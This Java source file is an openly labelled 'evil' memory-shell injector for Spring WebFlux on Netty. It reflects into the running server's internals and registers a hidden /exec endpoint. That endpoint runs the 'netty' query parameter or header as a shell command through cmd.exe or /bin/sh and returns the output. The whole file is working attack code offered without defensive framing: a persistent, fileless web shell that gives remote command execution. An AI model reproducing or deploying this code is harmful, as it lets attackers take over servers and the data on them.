package com.flux;

import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.Collection;
import java.util.Iterator;
import java.util.Scanner;

import org.springframework.boot.web.embedded.netty.NettyWebServer;
import org.springframework.http.ResponseEntity;
import org.springframework.http.server.reactive.ReactorHttpHandlerAdapter;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.method.HandlerMethod;
import org.springframework.web.reactive.DispatcherHandler;
import org.springframework.web.reactive.result.method.RequestMappingInfo;
import org.springframework.web.reactive.result.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.adapter.HttpWebHandlerAdapter;
import org.springframework.web.server.handler.ExceptionHandlingWebHandler;
import org.springframework.web.server.handler.FilteringWebHandler;

import static com.flux.Utils.invokeMethod;

@RestController
public class evilHandlerMethod {
    @RequestMapping("/handlerMethod")
    public String inject() throws Exception {
        Thread thread =null;
        for (Thread t : Thread.getAllStackTraces().keySet()) {
            if (t.getClass().getName().contains("NettyWebServer")) {
                thread = t;
            }
        }

        NettyWebServer nettyWebServer = (NettyWebServer) Utils.getField(thread ,"this$0");
        ReactorHttpHandlerAdapter reactorHttpHandlerAdapter = (ReactorHttpHandlerAdapter) Utils.getField(nettyWebServer ,"handler");
        Object o3 = Utils.getField(reactorHttpHandlerAdapter ,"httpHandler");
        HttpWebHandlerAdapter httpWebHandlerAdapter = (HttpWebHandlerAdapter) Utils.getField(o3 ,"delegate");
        ExceptionHandlingWebHandler exceptionHandlingWebHandler = (ExceptionHandlingWebHandler) Utils.getField(httpWebHandlerAdapter ,"delegate");
        FilteringWebHandler filteringWebHandler = (FilteringWebHandler) Utils.getField(exceptionHandlingWebHandler ,"delegate");

        RequestMappingHandlerMapping requestMappingHandlerMapping = null;
        DispatcherHandler d = (DispatcherHandler) Utils.getField(filteringWebHandler ,"delegate");

        Iterator it = d.getHandlerMappings().iterator();
        while (true) {
            if (!it.hasNext()) {
                break;
            }
            Object next = it.next();
            if (next.getClass().getName().contains("RequestMappingHandlerMapping")) {
                requestMappingHandlerMapping = (RequestMappingHandlerMapping) next;
                break;
            }
        }

        LogHandlerMethod evil = new LogHandlerMethod();

        Collection<HandlerMethod> values = requestMappingHandlerMapping.getHandlerMethods().values();
        Method method = evil.getClass().getMethod("invoke", ServerWebExchange.class);

        for (HandlerMethod handlerMethod : values) {
            if (handlerMethod.getMethod().equals(method)) {
                return "existed";
            }
        }

        invokeMethod(requestMappingHandlerMapping, "registerHandlerMethod",
                new Class[]{Object.class, Method.class, RequestMappingInfo.class},
                new Object[]{evil, method, RequestMappingInfo.paths(new String[]{"/exec"}).build()});
        return "success";
    }

}

class LogHandlerMethod {
    public static String paramName = "netty";

    public ResponseEntity<?> invoke(ServerWebExchange serverWebExchange) {
        String str = (String) serverWebExchange.getRequest().getQueryParams().getFirst(paramName);
        if (str == null || str.isEmpty()) {
            str = serverWebExchange.getRequest().getHeaders().getFirst(paramName);
        }
        String str2 = "";
        if (str != null) {
            try {
                str2 = new Scanner(getInputStream(getParam(str))).useDelimiter("\\A").next();
            } catch (Throwable th) {
            }
        }
        return ResponseEntity.ok(str2);
    }

    private String getParam(String str) {
        return str;
    }

    private InputStream getInputStream(String str) throws Exception {
        String[] split;
        String str2 = null;
        if (0 == 0) {
            split = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", str} : new String[]{"/bin/sh", "-c", str};
        } else if (str2.contains("\"{command}\"")) {
            String[] split2 = str2.split("\\s+");
            for (int i = 0; i < split2.length; i++) {
                split2[i] = split2[i].replace("\"{command}\"", str);
            }
            split = split2;
        } else {
            split = str2.replace("{command}", str).split("\\s+");
        }
        return new ProcessBuilder(split).redirectErrorStream(true).start().getInputStream();
    }
}
